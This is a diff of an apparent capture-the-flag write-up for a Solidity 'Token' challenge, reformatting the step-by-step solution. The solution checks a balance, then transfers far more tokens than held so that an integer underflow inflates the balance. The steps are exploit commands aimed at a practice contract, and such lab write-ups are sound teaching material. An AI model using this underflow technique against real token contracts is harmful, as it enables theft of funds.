@@ -39,10 +39,27 @@ contract Token {
 
 ## Writeup
 There is a famous security pitfall. We can use technique **Underoverflow** to complete this level.
-1. Get new instance
-2. `await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())`, it return default balance `20`
-3. `await contract.transfer('OTHER_ACCOUNT', 1000000)`
-4. `await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())`, it return a very big amount.
+1. Get new instance.
+2. Call method 
+    ``` solidity
+
+    await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())
+
+    ```
+  It will return default balance `20` .
+3. Call the method
+    ``` solidity 
+
+    await contract.transfer('OTHER_ACCOUNT', 1000000)
+
+    ```
+4. Call the method 
+    ``` solidity
+
+    await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())
+
+    ```
+  It will return a very big amount.
 5. Submit instance ξ( ✿＞◡❛)
 
 
